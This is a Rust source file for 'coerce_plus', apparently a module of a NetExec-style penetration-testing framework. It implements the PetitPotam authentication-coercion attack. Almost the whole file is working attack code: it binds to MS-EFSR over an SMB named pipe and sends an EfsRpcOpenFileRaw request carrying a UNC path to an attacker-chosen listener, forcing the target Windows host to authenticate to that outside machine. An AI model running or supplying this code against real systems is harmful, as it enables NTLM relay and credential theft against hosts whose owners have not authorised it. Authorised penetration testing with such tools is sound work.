//! # coerce_plus — Authentication Coercion
//!
//! Replicates `coerce_plus` coercing targets to authenticate to a listener
//! using specific endpoints like MS-EFSR (PetitPotam).

use anyhow::Result;
use async_trait::async_trait;
use nxc_protocols::NxcSession;
use tracing::{debug, error, info};

use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};

pub struct CoercePlus;

impl CoercePlus {
    pub fn new() -> Self {
        Self
    }
}

impl Default for CoercePlus {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for CoercePlus {
    fn name(&self) -> &'static str {
        "coerce_plus"
    }

    fn description(&self) -> &'static str {
        "Trigger SMB authentication back to an attacker IP using MS-EFSR (PetitPotam)."
    }

    fn supported_protocols(&self) -> &[&str] {
        &["smb"].as_slice()
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "LISTENER".to_string(),
                description: "IP address or hostname to coerce authentication to".to_string(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "PIPE".to_string(),
                description: "Named pipe to use for MS-EFSR (Default: lsarpc)".to_string(),
                required: false,
                default: Some("lsarpc".to_string()),
            },
        ]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let smb_session = match session.as_any().downcast_ref::<nxc_protocols::smb::SmbSession>() {
            Some(s) => s,
            None => return Err(anyhow::anyhow!("Module only supports SMB")),
        };

        let listener = match opts.get("LISTENER") {
            Some(l) => l,
            None => return Err(anyhow::anyhow!("LISTENER option is required")),
        };

        let pipe = opts
            .get("PIPE")
            .unwrap_or(&"lsarpc".to_string())
            .to_string();
        info!(
            "Attempting to coerce authentication from {} to listener {}",
            smb_session.target, listener
        );

        let smb = nxc_protocols::smb::SmbProtocol::new();

        use nxc_protocols::rpc::{efsr, DcerpcBind, DcerpcRequest, PacketType, UUID_EFSR};

        // Bind to MS-EFSR
        let bind = DcerpcBind::new(UUID_EFSR, 1, 0); // MS-EFSR v1.0

        let _bind_resp = match smb
            .call_rpc(smb_session, &pipe, PacketType::Bind, 1, bind.to_bytes())
            .await
        {
            Ok(resp) => resp,
            Err(e) => {
                error!("Failed to bind to {} over pipe '{}': {}", listener, pipe, e);
                return Err(anyhow::anyhow!("Bind failed"));
            }
        };

        debug!("Sent EFSR bind to pipe {}", pipe);

        // Send EfsRpcOpenFileRaw
        let target_path = format!("\\\\{}\\share\\file.txt\x00", listener);
        let req_payload = efsr::build_efsrpc_open_file_raw(&target_path);
        let dce_req = DcerpcRequest::new(efsr::EFSRPC_OPEN_FILE_RAW, req_payload);

        let _trigger_resp = match smb
            .call_rpc(
                smb_session,
                &pipe,
                PacketType::Request,
                2,
                dce_req.to_bytes(),
            )
            .await
        {
            Ok(resp) => resp,
            Err(e) => {
                error!(
                    "Failed to trigger EfsRpcOpenFileRaw check your listener! ({})",
                    e
                );
                // We still return true if we triggered because often the pipe closes upon coerce
                Vec::new()
            }
        };

        Ok(ModuleResult {
            success: true,
            output: format!(
                "Coercion payload sent to {} using EFSR on pipe {}. Check your listener at {}!",
                smb_session.target, pipe, listener
            ),
            data: serde_json::json!({ "listener": listener, "pipe": pipe, "method": "EfsRpcOpenFileRaw" }),
            credentials: vec![],
        })
    }
}
